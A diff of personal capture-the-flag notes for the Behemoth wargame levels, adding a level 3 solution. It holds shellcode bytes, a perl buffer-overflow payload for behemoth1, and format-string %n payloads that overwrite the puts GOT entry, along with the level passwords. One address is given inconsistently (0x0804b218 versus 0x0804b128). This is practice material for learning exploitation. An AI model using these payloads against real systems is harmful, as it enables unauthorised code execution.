@@ -345,7 +345,7 @@ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\
 (perl -e 'print "\x90"x71 . "\xb1\xd5\xff\xff"';cat) | ./behemoth1
 
 password: IxPJbQtH8q
-
+04
 ###############################################################################
 
 Level 2:
@@ -366,6 +366,52 @@ password: JQ6tZGqt0i
 ###############################################################################
 
 Level 3:
-Exploit: 
+Exploit: Format String Vulnerability
+
+* Overwrite function addr in the GOT (Binary Exploitation)
+
+$ objdump -d behemoth3          // static disassembly of ELF
+    call fgets                  // input for format string
+    call printf                 // vulnerability
+    call puts                <---- exploit by overwriting func addr in GOT
+
+$ objdump -R behemoth3          // Gets relocatable entries (libs)
+    0804b218  puts@GLIBC_2.0    // puts() GOT entry is stored at 0x0804b128
+
+* we want to overwrite 0x0804b128 -> shellcode address
+
+Shellcode = 
+\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8
+\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30
+\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81
+
+export SHELLCODE=$(perl -e 'print "\x90"x20 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
+
+environment variable location:  0xffffd57a
+puts GOT entry:                 0x0804b218
+
+perl -e 'print "AAAA\x18\xb2\x04\x08" . "%54634x%n"'
+Should place 0x0000d57a into puts GOT entry ---- Confirmed
+
+perl -e 'print "AAAA\x18\xb2\x04\x08" . "AAAA\x1a\xb2\x04\x08" . "%54634x%n%10893x%n"'
+
+perl -e 'print "AAAA\x18\xb2\x04\x08" . "AAAA\x1a\xb2\x04\x08" . "%x%x%54632x%n%10893x%n"'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
